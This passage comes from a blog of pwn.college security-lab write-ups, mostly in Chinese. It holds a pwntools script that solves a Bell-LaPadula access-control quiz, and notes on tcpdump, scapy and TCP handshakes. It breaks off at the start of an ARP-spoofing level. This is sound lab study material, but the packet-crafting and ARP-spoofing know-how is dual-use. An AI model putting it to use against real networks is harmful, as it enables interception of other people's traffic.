string">"NUC"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Category<span class="token punctuation">(</span><span class="token string">"NATO"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Category<span class="token punctuation">(</span><span class="token string">"ACE"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        Category<span class="token punctuation">(</span><span class="token string">"UFO"</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token punctuation">]</span>is_allowed_by_level <span class="token operator">=</span> subject<span class="token punctuation">.</span>level <span class="token operator">>=</span> <span class="token builtin">object</span><span class="token punctuation">.</span>level <span class="token keyword">if</span> is_read <span class="token keyword">else</span> <span class="token builtin">object</span><span class="token punctuation">.</span>level <span class="token operator">>=</span> subject<span class="token punctuation">.</span>levelis_allowed <span class="token operator">=</span> <span class="token boolean">False</span><span class="token keyword">if</span> is_allowed_by_level<span class="token punctuation">:</span>    <span class="token keyword">if</span> is_read<span class="token punctuation">:</span>        is_allowed <span class="token operator">=</span> is_subset_equal<span class="token punctuation">(</span>object_set<span class="token punctuation">,</span> subject_set<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        is_allowed <span class="token operator">=</span> is_subset_equal<span class="token punctuation">(</span>subject_set<span class="token punctuation">,</span> object_set<span class="token punctuation">)</span><span class="token keyword">if</span> is_allowed <span class="token operator">==</span> answer_allowed<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Correct!"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Incorrect!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> re<span class="token keyword">class</span> <span class="token class-name">Level</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> level<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>level <span class="token operator">=</span> level<span class="token keyword">class</span> <span class="token class-name">Category</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> bit<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>bit <span class="token operator">=</span> bit<span class="token keyword">def</span> <span class="token function">is_subset_equal</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>b <span class="token operator">|</span> a<span class="token punctuation">)</span> <span class="token operator">==</span> b<span class="token keyword">def</span> <span class="token function">judge_correct</span><span class="token punctuation">(</span>user_1<span class="token punctuation">,</span> user_2<span class="token punctuation">,</span> is_read<span class="token punctuation">)</span><span class="token punctuation">:</span>    subject <span class="token operator">=</span> LEVELS<span class="token punctuation">[</span>user_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token builtin">object</span> <span class="token operator">=</span>  LEVELS<span class="token punctuation">[</span>user_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    subject_set <span class="token operator">=</span> user_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    object_set <span class="token operator">=</span> user_2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    is_allowed_by_level <span class="token operator">=</span> subject<span class="token punctuation">.</span>level <span class="token operator">>=</span> <span class="token builtin">object</span><span class="token punctuation">.</span>level <span class="token keyword">if</span> is_read <span class="token keyword">else</span> <span class="token builtin">object</span><span class="token punctuation">.</span>level <span class="token operator">>=</span> subject<span class="token punctuation">.</span>level    is_allowed <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> is_allowed_by_level<span class="token punctuation">:</span>        <span class="token keyword">if</span> is_read<span class="token punctuation">:</span>            is_allowed <span class="token operator">=</span> is_subset_equal<span class="token punctuation">(</span>object_set<span class="token punctuation">,</span> subject_set<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_allowed <span class="token operator">=</span> is_subset_equal<span class="token punctuation">(</span>subject_set<span class="token punctuation">,</span> object_set<span class="token punctuation">)</span>        <span class="token keyword">return</span> is_allowedLEVELS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>CATEGORIES <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/run"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"(first is highest aka more sensitive):\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Level </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    level<span class="token operator">=</span> Level<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">40</span> <span class="token operator">-</span> i<span class="token punctuation">)</span>    LEVELS<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> levelp<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"5 Categories:\n"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Category </span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    category <span class="token operator">=</span> Category<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    CATEGORIES<span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> category<span class="token comment"># print(LEVELS)</span><span class="token comment"># print(CATEGORIES)</span>pattern <span class="token operator">=</span> <span class="token string">r'level (\w+) and categories \&#123;([^&#125;]*)\&#125;'</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Q "</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    user_2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    question <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> : </span><span class="token interpolation"><span class="token punctuation">&#123;</span>question<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token comment"># 查找所有匹配项</span>    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> question<span class="token punctuation">)</span>    <span class="token keyword">for</span> j<span class="token punctuation">,</span> <span class="token keyword">match</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>matches<span class="token punctuation">)</span><span class="token punctuation">:</span>        level <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        categories_set <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        set_ <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> categories <span class="token keyword">in</span> categories_set<span class="token punctuation">:</span>            <span class="token keyword">if</span> categories <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            set_ <span class="token operator">|</span><span class="token operator">=</span> CATEGORIES<span class="token punctuation">[</span>categories<span class="token punctuation">]</span><span class="token punctuation">.</span>bit        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            user_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>level<span class="token punctuation">)</span>            user_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>set_<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            user_2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>level<span class="token punctuation">)</span>            user_2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>set_<span class="token punctuation">)</span>            <span class="token keyword">if</span> judge_correct<span class="token punctuation">(</span>user_1<span class="token punctuation">,</span> user_2<span class="token punctuation">,</span> <span class="token string">"read"</span> <span class="token keyword">in</span> question<span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">127</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Q "</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-4-Writeup</title>
      <link href="/2024/09/07/pwn-college-web-4-writeup/"/>
      <url>/2024/09/07/pwn-college-web-4-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/intercepting-communication/">https://pwn.college/intro-to-cybersecurity/intercepting-communication/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-工具使用"><a href="#1-工具使用" class="headerlink" title="1. 工具使用"></a>1. 工具使用</h3><p><code>tcpdump</code>工具</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>port</td><td>指定端口</td></tr><tr><td>-nn</td><td>不解析主机名和服务名，直接显示ip和端口号</td></tr><tr><td>-tttt</td><td>显示详细的时间戳</td></tr><tr><td>-x</td><td>以十六进制和ascii格式显示数据包的内容</td></tr><tr><td>-w</td><td>保存数据包</td></tr><tr><td></td><td></td></tr></tbody></table><p><code>ip</code>工具</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>addr add <code>&lt;ip&gt;</code> dev <code>&lt;devname&gt;</code></td><td>为网卡添加多个ip地址</td></tr><tr><td>addr show</td><td>不解析主机名和服务名，直接显示ip和端口号</td></tr><tr><td></td><td></td></tr></tbody></table><p><code>route</code>工具</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>-n</td><td>列举本机的系统路由表</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p><code>tmux</code>工具</p><table><thead><tr><th>选项</th><th>作用</th></tr></thead><tbody><tr><td>new -s name</td><td>添加名为name的窗口</td></tr><tr><td>attach -t name</td><td>链接名为name的窗口</td></tr><tr><td>kill-session -t name</td><td>删除为名name的窗口</td></tr><tr><td>switch -t name</td><td>切换会话</td></tr><tr><td><code>CTRL + B </code> 和 <code>D</code></td><td>detach这个会话的快捷键，因为有的时候这个会话窗口正在执行命令，没办法通过命令执行的方式退出。</td></tr><tr><td>ls</td><td>显示所有会话</td></tr><tr><td>attach -t name</td><td>链接名为name的会话</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><p><code>scapy</code></p><table><thead><tr><th>序号</th><th>层名</th></tr></thead><tbody><tr><td>4</td><td>传输层</td></tr><tr><td>3</td><td>网络层</td></tr><tr><td>2</td><td>数据链路层</td></tr><tr><td>1</td><td>物理层</td></tr></tbody></table><ul><li><p>**<code>sr()</code>**（Send and Receive）：</p><ul><li>发送三层数据包（如 IP、TCP、UDP 等），并等待一个或多个响应。通常用于需要查看发送数据包后的回应情况（如 ICMP 回应）。</li><li>使用场景：发送一个或多个数据包，等待多个响应数据包，例如网络探测和扫描。</li></ul><p>**<code>sr1()</code>**（Send and Receive 1）：</p><ul><li>发送三层数据包，并只等待接收一个数据包的响应（第一个响应）。这是 <code>sr()</code> 的简化版本，只对第一个响应感兴趣。</li><li>使用场景：例如发送 TCP SYN 包并期待收到第一个 SYN-ACK 响应，用于简单的通信。</li></ul><p>**<code>srp()</code>**（Send and Receive at Layer 2）：</p><ul><li>发送二层数据包（如以太网帧，ARP 请求等），并等待响应。适合处理链路层数据包（OSI 模型的第二层，如 Ethernet）。</li><li>使用场景：例如 ARP 扫描和二层协议相关操作。</li></ul><p>**<code>send()</code>**：</p><ul><li>仅发送三层数据包，不等待任何响应。Scapy 会自动处理路由和二层信息（如以太网帧的封装）。</li><li>使用场景：不需要关心是否有响应的情况，如只发送 ICMP 请求或构造攻击流量。</li></ul><p>**<code>sendp()</code>**：</p><ul><li>发送二层数据包，不等待响应。直接处理链路层（如以太网帧），而不是依赖系统路由。</li><li>使用场景：在需要直接控制链路层数据包时，如发送自定义的以太网帧。</li></ul></li></ul><h3 id="2-三次握手和四次挥手的数据包"><a href="#2-三次握手和四次挥手的数据包" class="headerlink" title="2. 三次握手和四次挥手的数据包"></a>2. 三次握手和四次挥手的数据包</h3><h4 id="三次握手（建立连接）"><a href="#三次握手（建立连接）" class="headerlink" title="三次握手（建立连接）"></a><strong>三次握手（建立连接）</strong></h4><p>TCP 的三次握手用于确保双方都知道彼此的存在，并且可以正确同步各自的序列号和确认号，从而保证数据的可靠传输。</p><ol><li><strong>第一次握手（SYN）</strong>：<ul><li>客户端发送一个 <code>SYN</code>（同步序列号）请求给服务器，表明客户端希望建立连接，并携带初始序列号（<code>seq</code>）。</li></ul></li><li><strong>第二次握手（SYN-ACK）</strong>：<ul><li>服务器收到 <code>SYN</code> 后，回复一个带有 <code>SYN</code> 和 <code>ACK</code>（确认）标志的响应，表示它同意建立连接，并且确认了客户端的初始序列号。服务器还会发送自己的初始序列号。</li></ul></li><li><strong>第三次握手（ACK）</strong>：<ul><li>客户端收到 <code>SYN-ACK</code> 后，再回复一个 <code>ACK</code>，表示确认了服务器的初始序列号，并完成连接建立。</li></ul></li></ol><p><strong>四次挥手</strong>：关闭 TCP 连接的过程通常称为“四次挥手”：</p><ol><li><strong>第一步</strong>：主动关闭方发送一个带有 FIN 标志的数据包。</li><li><strong>第二步</strong>：被动关闭方接收到这个 FIN 数据包后，发送一个 ACK 确认。</li><li><strong>第三步</strong>：被动关闭方发送自己的 FIN 数据包，表示它也完成了数据传输。</li><li><strong>第四步</strong>：主动关闭方接收到 FIN 数据包后，发送一个 ACK 确认，连接关闭完成。</li></ol><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">19:37:27.714010 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [S], seq 3927600946, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 00x0000:  4500 0034 8081 4000 4006 a460 c0a8 ca01  E..4..@.@..`....0x0010:  c0a8 ca8f e37e 3039 ea1a 6f32 0000 0000  .....~09..o2....0x0020:  8002 faf0 f137 0000 0204 05b4 0103 0308  .....7..........0x0030:  0101 0402                                ....19:37:27.714030 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [S.], seq 3152951559, ack 3927600947, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 00x0000:  4500 0034 0000 4000 4006 24e2 c0a8 ca8f  E..4..@.@.$.....0x0010:  c0a8 ca01 3039 e37e bbee 3907 ea1a 6f33  ....09.~..9...o30x0020:  8012 faf0 1609 0000 0204 05b4 0101 0402  ................0x0030:  0103 0307                                ....19:37:27.714280 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 1, win 4106, length 00x0000:  4500 0028 8082 4000 4006 a46b c0a8 ca01  E..(..@.@..k....0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.0x0020:  5010 100a 27eb 0000 0000 0000 0000       P...'.........19:37:27.731273 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [P.], seq 1:86, ack 1, win 4106, length 850x0000:  4500 007d 8083 4000 4006 a415 c0a8 ca01  E..&#125;..@.@.......0x0010:  c0a8 ca8f e37e 3039 ea1a 6f33 bbee 3908  .....~09..o3..9.0x0020:  5018 100a c4a4 0000 4745 5420 2f20 4854  P.......GET./.HT0x0030:  5450 2f31 2e31 0d0a 486f 7374 3a20 3139  TP/1.1..Host:.190x0040:  322e 3136 382e 3230 322e 3134 333a 3132  2.168.202.143:120x0050:  3334 350d 0a55 7365 722d 4167 656e 743a  345..User-Agent:0x0060:  2063 7572 6c2f 372e 3535 2e31 0d0a 4163  .curl/7.55.1..Ac0x0070:  6365 7074 3a20 2a2f 2a0d 0a0d 0a         cept:.*/*....19:37:27.731291 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 86, win 502, length 00x0000:  4500 0028 2d5f 4000 4006 f78e c0a8 ca8f  E..(-_@.@.......0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.0x0020:  5010 01f6 15fd 0000                      P.......19:37:45.859884 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [F.], seq 1, ack 86, win 502, length 00x0000:  4500 0028 2d60 4000 4006 f78d c0a8 ca8f  E..(-`@.@.......0x0010:  c0a8 ca01 3039 e37e bbee 3908 ea1a 6f88  ....09.~..9...o.0x0020:  5011 01f6 15fd 0000                      P.......19:37:45.860242 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [.], ack 2, win 4106, length 00x0000:  4500 0028 8084 4000 4006 a469 c0a8 ca01  E..(..@.@..i....0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.0x0020:  5010 100a 2795 0000 0000 0000 0000       P...'.........19:37:49.128674 ens33 In  IP 192.168.202.1.58238 > lebron-virtual-machine.12345: Flags [F.], seq 86, ack 2, win 4106, length 00x0000:  4500 0028 8085 4000 4006 a468 c0a8 ca01  E..(..@.@..h....0x0010:  c0a8 ca8f e37e 3039 ea1a 6f88 bbee 3909  .....~09..o...9.0x0020:  5011 100a 2794 0000 0000 0000 0000       P...'.........19:37:49.128690 ens33 Out IP lebron-virtual-machine.12345 > 192.168.202.1.58238: Flags [.], ack 87, win 502, length 00x0000:  4500 0028 0000 4000 4006 24ee c0a8 ca8f  E..(..@.@.$.....0x0010:  c0a8 ca01 3039 e37e bbee 3909 ea1a 6f89  ....09.~..9...o.0x0020:  5010 01f6 35a8 0000                      P...5...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-为什么是三次握手和四次挥手？"><a href="#3-为什么是三次握手和四次挥手？" class="headerlink" title="3. 为什么是三次握手和四次挥手？"></a>3. 为什么是三次握手和四次挥手？</h3><h4 id="为什么是三次握手？"><a href="#为什么是三次握手？" class="headerlink" title="为什么是三次握手？"></a><strong>为什么是三次握手？</strong></h4><ul><li><strong>最少次数确保同步</strong>：三次握手足以保证双方知道对方的序列号、确认号，并且确认连接的可靠性。如果只有两次握手，客户端无法确认服务器收到了它的 SYN 并正确理解了它的初始序列号，服务器也无法确认客户端知道它的序列号。</li><li><strong>效率最优</strong>：三次握手是实现可靠数据传输的最小次数。如果增加更多握手次数，不会显著提高连接的可靠性，反而会增加不必要的延迟。</li></ul><h4 id="为什么是四次挥手？"><a href="#为什么是四次挥手？" class="headerlink" title="为什么是四次挥手？"></a>为什么是四次挥手？</h4><ul><li><strong>双向关闭</strong>：TCP 连接是双向的，每一方都需要分别关闭各自的发送通道。客户端和服务器需要独立发送和确认 <code>FIN</code>，因此每一方需要两步：发送 <code>FIN</code> 和确认对方的 <code>FIN</code>。</li><li><strong>避免数据丢失</strong>：四次挥手保证了双方都有机会在关闭连接前完成数据传输。特别是服务器在收到客户端的 <code>FIN</code> 后，可能还有未发送的数据需要发送出去，这时它可以先回复 <code>ACK</code>，然后继续发送数据，等发送完毕后再发送 <code>FIN</code>。如果服务器在收到客户端的 <code>FIN</code> 数据包后还有未发送的数据，客户端<strong>仍会继续确认服务器发送的数据包</strong>，即使客户端已经发送了 <code>FIN</code> 来关闭自己到服务器的传输通道。</li></ul><h3 id="4-一个主机可以绑定多个ip地址。"><a href="#4-一个主机可以绑定多个ip地址。" class="headerlink" title="4. 一个主机可以绑定多个ip地址。"></a>4. 一个主机可以绑定多个ip地址。</h3><p><strong>虚拟主机</strong>：在同一物理服务器上运行多个网站，每个网站绑定不同的 IP 地址。</p><p><strong>多网络配置</strong>：主机可以同时连接多个网络，并在不同网络间转发流量。</p><p><strong>负载均衡</strong>：使用多个 IP 地址以支持负载均衡应用。</p><h3 id="5-send-和sendp的区别"><a href="#5-send-和sendp的区别" class="headerlink" title="5. send 和sendp的区别"></a>5. send 和sendp的区别</h3><p><code>Scapy</code> 中的 <code>sendp</code> 和 <code>send</code> 都是用于发送数据包的函数，但它们的作用范围不同，主要区别在于<strong>协议层</strong>的不同：</p><h4 id="1-sendp-："><a href="#1-sendp-：" class="headerlink" title="1. **sendp**："></a>1. **<code>sendp</code>**：</h4><ul><li><strong>用于发送链路层（数据链路层）报文</strong>，包括以太网帧。</li><li>需要<strong>指定网络接口</strong>（如 <code>eth0</code>），因为在链路层发送报文时，需要明确指定从哪个物理接口发送。</li><li>适用于发送包含 <code>Ether</code> 头部的原始帧，或进行更低级别的网络通信，如自定义的以太网帧</li></ul><h4 id="2-send-："><a href="#2-send-：" class="headerlink" title="2. **send**："></a>2. **<code>send</code>**：</h4><ul><li><strong>用于发送网络层（IP层）报文</strong>，如 ICMP、TCP、UDP 数据包。</li><li>不需要指定网络接口，Scapy 会自动选择合适的接口（通常是根据路由表决定的）。</li><li>适用于发送网络层以上的报文，不包括以太网头部。</li></ul><h3 id="6-lo-Loopback-和eth0接口的区别"><a href="#6-lo-Loopback-和eth0接口的区别" class="headerlink" title="6. lo(Loopback)和eth0接口的区别"></a>6. lo(Loopback)和eth0接口的区别</h3><h5 id="eth0-接口："><a href="#eth0-接口：" class="headerlink" title="eth0 接口："></a><strong><code>eth0</code> 接口：</strong></h5><ul><li><strong><code>eth0</code> 是以太网接口</strong>，它负责连接你的主机和外部网络。数据包通过这个接口与外部设备、路由器、交换机等通信。<code>eth0</code> 接口使用你配置的 IPv4 地址 <code>10.0.0.2</code> 来和外部主机（例如 <code>10.0.0.3</code>）进行通信。</li><li><strong>使用场景</strong>：用于与其他网络设备通信，例如通过这个接口发送数据包到其他主机或接入外部网络。</li></ul><h5 id="lo-Loopback-接口："><a href="#lo-Loopback-接口：" class="headerlink" title="lo (Loopback) 接口："></a><strong><code>lo</code> (Loopback) 接口：</strong></h5><ul><li><strong><code>lo</code> 接口是本地回环接口</strong>，用于在同一台机器上测试和通信。通过 <code>lo</code> 发送的数据包永远不会离开本机，它只会在本地回环。因此，任何发送到 <code>127.0.0.1</code> 或本地回环的 IP 地址的数据包，都通过 <code>lo</code> 接口处理。</li><li><strong>使用场景</strong>：用于自测应用程序、开发和调试。例如，访问本机的服务时使用 <code>127.0.0.1</code>（本地 IP 地址）。</li></ul><p>如果你使用 <code>Scapy</code> 的 <code>send()</code> 函数发送 IP 层数据包，而没有指定接口，系统会根据路由表自动选择合适的网络接口。这通常是基于目标 IP 地址来决定的。</p><h4 id="如何选择接口："><a href="#如何选择接口：" class="headerlink" title="如何选择接口："></a>如何选择接口：</h4><ul><li>通过路由表：操作系统会检查路由表，基于目标 IP 地址找到最合适的出接口。例如：<ul><li>如果目标 IP 地址是本地回环地址（如 <code>127.0.0.1</code>），则数据包会通过 <code>lo</code>（回环接口）发送。</li><li>如果目标 IP 地址是局域网中的其他主机（如 <code>10.0.0.3</code>），则数据包会通过 <code>eth0</code>（以太网接口）发送。</li></ul></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h2 id="level-13—–写着写着给我绕晕了。。。。"><a href="#level-13—–写着写着给我绕晕了。。。。" class="headerlink" title="level 13—–写着写着给我绕晕了。。。。"></a>level 13—–写着写着给我绕晕了。。。。</h2><p><strong>关于ARP欺骗的，好像我之前上刚子（梁刚老师）的《产品实践课程》的时候，这个问题我就犯过一次</strong></p><p><strong>场景</strong>：<code>10.0.0.4</code> 想要跟<code>10.0.0.2 